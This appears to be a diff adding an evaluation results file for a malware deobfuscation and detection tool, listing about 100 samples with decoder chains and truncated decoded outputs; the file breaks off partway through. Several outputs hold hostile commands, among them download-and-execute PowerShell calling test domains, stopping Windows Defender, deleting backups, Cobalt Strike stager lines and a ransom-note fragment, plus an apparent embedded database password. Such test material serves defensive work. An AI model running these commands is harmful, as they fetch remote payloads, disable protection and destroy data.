@@ -1,0 +1,996 @@
+{
+  "total": 103,
+  "passed": 35,
+  "hit_rate": 0.3398,
+  "threshold": 0.6,
+  "results": [
+    {
+      "sha1": "7e0a722888e2f08b7a5e932db6a91dca4856fb77",
+      "engine": "convergence",
+      "chain": [
+        "content-ps-operator-case-normalize",
+        "decoder-powershell-encoded-command",
+        "semantic-ps-alias-expand"
+      ],
+      "output_head": "Invoke-Expression",
+      "ok": true
+    },
+    {
+      "sha1": "fed5658f139d347e38b79f63e7769e6e90017c11",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "base64-decode"
+      ],
+      "output_head": "\u00ad\u00a9\u00dd\u00a2o\u00a7\u00a2+\u001e\u00faz-\u00f9\u00e9\u00dc\u00a1\u00d7\u009d\u00f9\u00a6\u00dcu\u00e7\u00e0\u0086(\u00f5\u00db~9",
+      "ok": true
+    },
+    {
+      "sha1": "ffe2866c6b8664a52af4d5d13be0dee25e8ea938",
+      "engine": "convergence",
+      "chain": [
+        "semantic-ps-alias-expand"
+      ],
+      "output_head": "powershell -c Invoke-Expression(Invoke-WebRequest http://malicious-test-domain.top/x); Invoke-Expression $(cmd /c 'nsloo",
+      "ok": true
+    },
+    {
+      "sha1": "5a0f8e7798e03b81b53c2bddb1f5a5f65610c249",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "powershell-alias-normalize"
+      ],
+      "output_head": "IEX(Invoke-WebRequest http://malicious-test-domain.top/x); connect 45.148.10.181",
+      "ok": true
+    },
+    {
+      "sha1": "70db2df97b3e88c66c50ef9df98dc51de491cc7d",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "hello",
+      "ok": false
+    },
+    {
+      "sha1": "014a88cd1c3ec428bd2cbf2a49cc96ca8ad1ad0f",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-detect"
+      ],
+      "output_head": "\"--dbname=postgresql://enteliweb:n3wenteli878wb12e4b2@127.0.0.1:49900/enteliweb --column-inserts --data-only --disable-t",
+      "ok": false
+    },
+    {
+      "sha1": "b6796e78f381654372d4cbd154fb8f9f7444c775",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "base64-decode",
+        "xor-brute",
+        "powershell-backtick-normalize",
+        "caesar-decode"
+      ],
+      "output_head": "}\u00a4i$i\u00a4i$i$k\u00e4i$i\u00e4~\u00e4i%s,s\u0007s%t\u00f4t\u00b8tat\u00d8ttmt0tt\u0000t\u00f8ts\u0080ttIpiii~e$i}iss$",
+      "ok": true
+    },
+    {
+      "sha1": "0fadbf25f40d74494cfab4a1a3f006bdb9316085",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "base32-decode",
+        "nibble-swap",
+        "powershell-backtick-normalize",
+        "base91-decode"
+      ],
+      "output_head": "0\u0081\u0011\u00a8\u0087P\u000e\u0013\u0018\u0001\u00a8\u00f0\u00030\u0081\u0011\u00d0\u0004\u009a\u0000\u0013\u0018\u0081zP\u000f0\u0081\u0011L\u00f2",
+      "ok": true
+    },
+    {
+      "sha1": "d407c04e0b7193668b3f5f1624d5530a3ca6b37b",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload"
+      ],
+      "output_head": "whoami",
+      "ok": true
+    },
+    {
+      "sha1": "191925ecaf3e468af6a3eae576835bef29ee77cd",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract"
+      ],
+      "output_head": "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\nAll your important documents, photos, databases and other files have been encrypt",
+      "ok": false
+    },
+    {
+      "sha1": "d92873833e6ffd2b917d36eb547d1422107601c3",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload"
+      ],
+      "output_head": "sc.exe stop WinDefend",
+      "ok": true
+    },
+    {
+      "sha1": "6c06f9eff8f4c60622f7eb107e8564af1892d07e",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "ioc-extract"
+      ],
+      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 RC4                      key_source=inline recovery=static-complete ",
+      "ok": true
+    },
+    {
+      "sha1": "426951616d42ea71b5010516cd9cc0ac9be7de42",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "ioc-extract"
+      ],
+      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 RC4                      key_source=inline recovery=static-complete ",
+      "ok": true
+    },
+    {
+      "sha1": "a8f14303bb3be565ccccd7ea34da1d803a11a3c1",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-1.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "22d3fd0fb38798a4633879978bfb61f44fbfc113",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-2.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "08de7c986951e592a2dd1936794c30a1b8727537",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-3.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "3b7cbc6a28d701250d07666f176f840baa77dc7d",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-4.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "8abd5cee3640503dac144e46795ed3c21219a885",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-5.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "89593f33db457d7c5bef74b250c3a1eb672ee0a6",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-1.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "b69f2ac1751abddb95e15f42a76f42186893f29e",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-2.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "ff9d05e171379a9def0ce47405dcd0dfd98a1299",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-3.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "48f3e01d3d08a9dceee801e9b80868d10336faea",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-4.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "af8903991fd9ceb7d4bdff507a9ec4cfdb32ec1e",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-5.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "ae757110d8a75c8a3a702187a2e906a01c8dda30",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "Select-Object id, name FROM users Where-Object active = 1;",
+      "ok": true
+    },
+    {
+      "sha1": "8064f1b8d1e57ae9b384076d70eeed9b47ac6bf4",
+      "engine": "convergence",
+      "chain": [
+        "content-numeric-constant-fold"
+      ],
+      "output_head": "2023-14T12:34:56Z INFO service started",
+      "ok": true
+    },
+    {
+      "sha1": "113cea36a6da4c4bc8627039b4f3d067aca2c4e1",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "import numpy as np\ndata = np.zeros((10, 10))",
+      "ok": false
+    },
+    {
+      "sha1": "ea55504afa6416b4f4b89ac4cc386c575f00929a",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "192.168.1.1 is on the LAN \u2014 safe internal address",
+      "ok": false
+    },
+    {
+      "sha1": "272a202c058813509ca4b959cc41ec6ed8834131",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract"
+      ],
+      "output_head": "email me at john.doe@example.com if you have questions",
+      "ok": false
+    },
+    {
+      "sha1": "2aae6c35c94fcfb415dbe95f408b9ce91ee846ed",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "hello world",
+      "ok": false
+    },
+    {
+      "sha1": "c7a19cb10c70666f0a4299b85692e11b6c8b2f1b",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "wbadmin delete systemstatebackup -keepversions:0",
+      "ok": false
+    },
+    {
+      "sha1": "eb32fe579f52b910a0bcb15c09d78747b6d0e34f",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "cipher /w:C:\\",
+      "ok": false
+    },
+    {
+      "sha1": "1584af34536103c086f163f599640acbb9f26155",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "cmd /c \"whoami && netstat -ano\"",
+      "ok": false
+    },
+    {
+      "sha1": "5fd384bfadd38c3f124a8f654b47c069ee55dde9",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "i",
+      "ok": false
+    },
+    {
+      "sha1": "97b8825cc08fdde82d18aaa26f4c1dab3fa963c9",
+      "engine": "convergence",
+      "chain": [
+        "semantic-ps-alias-expand"
+      ],
+      "output_head": "$k=[System.Text.Encoding]::ASCII.GetBytes(\"KEY\"); $b=[byte[]](7,36,25,32,17,29,25,12,32,25,52,11,17,4,12); $d=-join(0..(",
+      "ok": true
+    },
+    {
+      "sha1": "f18d46780fda16ff0927300bdc7cd4f7112bf2da",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "print(1+1)",
+      "ok": false
+    },
+    {
+      "sha1": "1b42e8db26f7d6de7901f6f19c7ee61de4b11df9",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "notepad readme.txt",
+      "ok": false
+    },
+    {
+      "sha1": "d0a44a6f10acaf1cbdf099b429f6ab013d5b0882",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
+      "ok": false
+    },
+    {
+      "sha1": "940b661e76ae57f083336270cf9646b56a91c2d7",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUE=';    var b=atob(d);    var l=document.createElement('a');    l.download='payload.exe';    l.href=URL",
+      "ok": false
+    },
+    {
+      "sha1": "74922dfbd46d5c3ec773a59cd4d6868acc352b50",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
+      "ok": false
+    },
+    {
+      "sha1": "a3000b7c7aac53570a950f75827a60847132ed73",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUE=';        var b=atob(d);        var l=document.createElement('a');        l.download='payload.exe';  ",
+      "ok": false
+    },
+    {
+      "sha1": "888ca0494ea03d52b32013c26f891ade2f651b1b",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
+      "ok": false
+    },
+    {
+      "sha1": "9dab0c64d545d383773f8738c8f89e80183784e6",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUE=';            var b=atob(d);            var l=document.createElement('a');            l.download='pay",
+      "ok": false
+    },
+    {
+      "sha1": "f9f75777c6ec5ce767f90a3564eba599398a4d58",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "binary-A",
+      "ok": false
+    },
+    {
+      "sha1": "be20c2c37e2ee3cf3b04f60542cfa9f19e5ca83e",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUM='; var b=atob(d); var l=document.createElement('a'); l.download='stager.js'; l.href=URL.createObjectU",
+      "ok": false
+    },
+    {
+      "sha1": "73d7f991eb4f45f1cd0c111ac8b263c25aac9a2b",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUM=';    var b=atob(d);    var l=document.createElement('a');    l.download='stager.js';    l.href=URL.c",
+      "ok": false
+    },
+    {
+      "sha1": "815f7f3c78f3e2f33674b6d45e28297ca2063dfc",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUM='; var b=atob(d); var l=document.createElement('a'); l.download='stager.js'; l.href=URL.createObjectU",
+      "ok": false
+    },
+    {
+      "sha1": "892ed1156a4390ee17d9583a72b5c90eb1eca957",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUM=';        var b=atob(d);        var l=document.createElement('a');        l.download='stager.js';    ",
+      "ok": false
+    },
+    {
+      "sha1": "75961e94374593ec0d56c3fa71e7a69b834a20aa",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUM='; var b=atob(d); var l=document.createElement('a'); l.download='stager.js'; l.href=URL.createObjectU",
+      "ok": false
+    },
+    {
+      "sha1": "dc5969c50b2137c3bcf9e0105f44799198fe1dba",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUM=';            var b=atob(d);            var l=document.createElement('a');            l.download='sta",
+      "ok": false
+    },
+    {
+      "sha1": "74039109c9017d452ea18c24594ccc4e69633b10",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "var d='YmluYXJ5LUM='; var b=atob(d); var l=document.createElement('a'); l.download='stager.js'; l.href=URL.createObjectU",
+      "ok": false
+    },
+    {
+      "sha1": "6e2ab035d8c5951f1d91102d16be119683004146",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize",
+        "crypto-detect"
+      ],
+      "output_head": "function _0x29d5() { const t = ['mdq0ytfKmwy','mtG5nZqWrLrLEMLS','y3nZvgv4Da']; return t; }\n    (function(a, b) { const ",
+      "ok": true
+    },
+    {
+      "sha1": "bd9eb6daa30c514127171560f23c7251407d3f49",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize"
+      ],
+      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 OpenSSL:AES-CBC          key_source=inline recovery=runtime-required",
+      "ok": true
+    },
+    {
+      "sha1": "c90030f3ad0174333f56ebf287ee08023a78aa45",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize"
+      ],
+      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 ChaCha20                 key_source=inline recovery=runtime-required",
+      "ok": true
+    },
+    {
+      "sha1": "497c214024c8c165981baa74ce3226a5eb872fe6",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize"
+      ],
+      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 3DES                     key_source=inline recovery=runtime-required",
+      "ok": true
+    },
+    {
+      "sha1": "2bba7c08b75da4299fd15987796ff2130a950c40",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize"
+      ],
+      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 RC4                      key_source=inline recovery=runtime-required",
+      "ok": true
+    },
+    {
+      "sha1": "4cf1c3e2ef81e5a21c9ced974dc0ece8a68fa74a",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize"
+      ],
+      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 GPG-symmetric            key_source=inline recovery=runtime-required",
+      "ok": true
+    },
+    {
+      "sha1": "3d136e8573b7af2e26b5ee19f6e0835f8c0a2bad",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize",
+        "crypto-api-annotator",
+        "powershell-backtick-normalize"
+      ],
+      "output_head": "\u25bc CRYPTO API DETECTED (RC4.1 \u00b7 honest-verdict)\n\n  \u00b7 GPG-symmetric            key_source=inline recovery=runtime-required",
+      "ok": true
+    },
+    {
+      "sha1": "d6be764edc6030fc64f63aa44e31140155bbf56c",
+      "engine": "convergence",
+      "chain": [
+        "content-env-var-case-normalize"
+      ],
+      "output_head": "openssl enc -aes-256-cbc -in backup.tgz -out backup.tgz.enc -k $env:backup_key",
+      "ok": true
+    },
+    {
+      "sha1": "be4fa6d6a87306122c662701c212ab69662fa969",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "Get-Process | Where-Object CPU -gt 100",
+      "ok": false
+    },
+    {
+      "sha1": "39bc5cb078aa6a4cad06e89db720ca25bb54f6b5",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "schtasks /query /fo LIST /v",
+      "ok": false
+    },
+    {
+      "sha1": "1b2fa2c1cd7e555ce09d6046372293b7d771dee9",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "set \"p=c_a_l_c_._e_x_e\" && Start-Process %p:_=%",
+      "ok": true
+    },
+    {
+      "sha1": "e43fc82dfe47d42a53b70957b028fec7853d3165",
+      "engine": "convergence",
+      "chain": [
+        "content-ps-operator-case-normalize"
+      ],
+      "output_head": "PoWeRsHeLl.eXe,-noprofile,-executionpolicy,ByPaSs,-command,\"Write-Host '[+] Mixed Case Test'\"",
+      "ok": true
+    },
+    {
+      "sha1": "4b1a07b5a78dcdbea29be3c287903a41df793e2c",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "Write-Output \"opening\" 'closing' \"another string\" 'and-another'",
+      "ok": true
+    },
+    {
+      "sha1": "f87fa6b84bf4799448d1eca995e96ac9e533473e",
+      "engine": "convergence",
+      "chain": [
+        "content-ps-operator-case-normalize"
+      ],
+      "output_head": "powershell.exe -noprofile -executionpolicy UnReStRiCtEd",
+      "ok": true
+    },
+    {
+      "sha1": "2e26648e784ec7a0cf4d08534ddda41df35f1a30",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "Write-Output hello",
+      "ok": true
+    },
+    {
+      "sha1": "566b78692dc51d1927650a5bbaad8c507388c0aa",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "\"C:\\Program Files (x86)\\Kodak\\Prinergy Evo 9.0.0.0\\bin\\JFloatLicMgrD.exe\" -c",
+      "ok": false
+    },
+    {
+      "sha1": "de6c8bd5d224bc6e8eac248ae887cda63f4a6c5c",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "Write-Host \"Hello, world\"",
+      "ok": false
+    },
+    {
+      "sha1": "4233fb8417a5278a07306a7704110ef2a0d5a1d8",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "--runaszvideo=TRUE\n    --useroption=2347222064534913024\n    --useroption2=1152956688981395520\n    --useroption3=69176006",
+      "ok": false
+    },
+    {
+      "sha1": "9ea26a3711c1c10b506157a14833c46840544ce5",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "--runaszvideo=TRUE\n    --useroption=2347222064534913024\n    --useroption2=1152956688981395520\n    --haszoomim=1",
+      "ok": false
+    },
+    {
+      "sha1": "157fa2cf7908b959ec6cae7b4ca0e8463f2777c3",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "--runaszvideo=TRUE --useroption=2347222064534913024 --useroption2=1152956688981395520 --useroption3=6917600633341970944 ",
+      "ok": false
+    },
+    {
+      "sha1": "edf427c8eadff87348a1965681f7d5348c68a601",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "FuturePrint\\Windows\\menu\\menu_En.exe x64",
+      "ok": false
+    },
+    {
+      "sha1": "4514cea4027c959ea08982e1d1bad05af56e1adb",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "# vendor=Cisco XDR\nevent[0] host=AZG51 user=User path=menu_En.exe detection=Alert threat=high",
+      "ok": false
+    },
+    {
+      "sha1": "bd907aa2280549494055de165f6230d94ce69af1",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "just some text",
+      "ok": false
+    },
+    {
+      "sha1": "2dbb56915aff141470bfa3346d468e40a514f5fe",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "test 12345",
+      "ok": false
+    },
+    {
+      "sha1": "5d0e284372faf08e9d483f6fa208e7110fe8e2fd",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "powershell -c \"Invoke-WebRequest -Uri http://8.8.8.8/x -OutFile a.exe\"",
+      "ok": false
+    },
+    {
+      "sha1": "abe8fc0b05effd3fd219bb44f6400e9c2bc1048c",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "powershell -c \"Invoke-WebRequest -Uri http://8.8.8.8/a -OutFile a.exe\"",
+      "ok": false
+    },
+    {
+      "sha1": "eff48a804a64094c59a678ca55f96a198a9a30cf",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "Get-Process | Where-Object { $_.CPU -gt 100 }",
+      "ok": false
+    },
+    {
+      "sha1": "3ddb8ca1b50e240736bb4b86fdff00ffc79d8c47",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "ipconfig /all",
+      "ok": false
+    },
+    {
+      "sha1": "1e496735e9224be745ac5c094245888cb37c546c",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "# vendor=CrowdStrike Falcon\nevent[0] host=WKST-014 user=corp\\jdoe detection=DetectionSummaryEvent",
+      "ok": false
+    },
+    {
+      "sha1": "23378e603f5a4d362d80e25c8bfacaf8b39d6ac6",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "# vendor=Cisco Secure Endpoint\nevent[0] user=alice",
+      "ok": false
+    },
+    {
+      "sha1": "ca1cc8941071fd8ef90f6fcc757a7f0bd0c60151",
+      "engine": "convergence",
+      "chain": [
+        "content-ps-operator-case-normalize"
+      ],
+      "output_head": "powershell -noprofile Write-Host \"Decoder Validation\"",
+      "ok": true
+    },
+    {
+      "sha1": "eb1e5629474943b79f80e1f77b32c0486d6df8f0",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "ioc-extract",
+        "family-emotet"
+      ],
+      "output_head": "http://ex.com/a",
+      "ok": true
+    },
+    {
+      "sha1": "9af97d025ca0bd746fbfec0bc12686a4d9d24114",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "powershell-alias-normalize"
+      ],
+      "output_head": "Write-Output 'hello world'  # note: this is not powershell",
+      "ok": true
+    },
+    {
+      "sha1": "699cb60ef23bf6b5407ead7e59cadf0d2ced0d68",
+      "engine": "convergence",
+      "chain": [
+        "decoder-xor-byte-array"
+      ],
+      "output_head": "44776611003322dd",
+      "ok": true
+    },
+    {
+      "sha1": "8fadfc0c1658c3abcf41e97baffd9bbf814cbe6e",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "Write-Host \"tweet, tweet!\"",
+      "ok": false
+    },
+    {
+      "sha1": "45d9ad0e642c0330e9a166e3dde24d650955a3b1",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "Hello",
+      "ok": false
+    },
+    {
+      "sha1": "7b1cb5e0614b14bb2bd93873d9f89f63aaa4f812",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1785867328 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "a9373fa4ce435cd73ef0034b5d4f8ec4971355c0",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1785867519 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "208bf536747f6fb23dcbc67bf4d82dee87ac8c4c",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1785894391 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "48fb3e5aff86c567a24f2dfaafb955ca3d6b5281",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1785928267 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "5d56b30a006017e85990ea0cb3f00e199a048edd",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1785929890 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "b35757d435e60cd49f380fe2a88acaa696173bb7",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1785997178 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "7a4e15af8ef0ecb3430c2891554ef296f1adbcbb",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786019726 nivxray unique payload",
+      "ok": false
+    },
+    {
